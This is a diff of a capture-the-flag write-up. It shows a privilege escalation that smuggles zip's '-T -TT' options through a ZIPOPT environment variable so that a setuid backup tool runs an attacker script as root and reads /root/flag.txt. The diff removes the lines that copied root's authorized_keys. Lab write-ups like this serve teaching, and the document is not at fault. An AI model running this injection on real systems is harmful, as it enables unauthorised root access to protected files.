@@ -256,7 +256,7 @@ drwx------ 4 root root 4096 Jul  6 12:31 ..
 -rw------- 1 root root  161 Jun 23 12:20 authorized_keys
 ```
 
-Awesome, that worked well! We have spotted the flag, but also `/root/.ssh/authorized_keys`!
+Awesome, that worked well! We have spotted the flag!
 
 ## Now it's Flag Time!
 
@@ -264,14 +264,10 @@ Connect to the real target machine.
 
 ```console
 $ echo "cat /root/flag.txt > /tmp/flag.txt" > pwn.sh
-$ echo "cat /root/.ssh/authorized_keys > /tmp/auth.txt" >> pwn.sh
 $ chmod +x pwn.sh 
 $ ZIPOPT=" -T -TT /tmp/pwn.sh " /usr/local/sbin/backup 1>/dev/null 2>&1
 $ cat flag.txt 
 CS{ZIPOPT_shenanigans}
-$ cat auth.txt 
-ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGoTezo9v9hsEowLFIXfPrs2NydQ1f9+fP9/fwq2qciR9TeUEGHoOCfA44lAVfzorKmxrXWHpS7K0bSgCuLEFyc=
-```
 
 We got the flag, perfect.
 
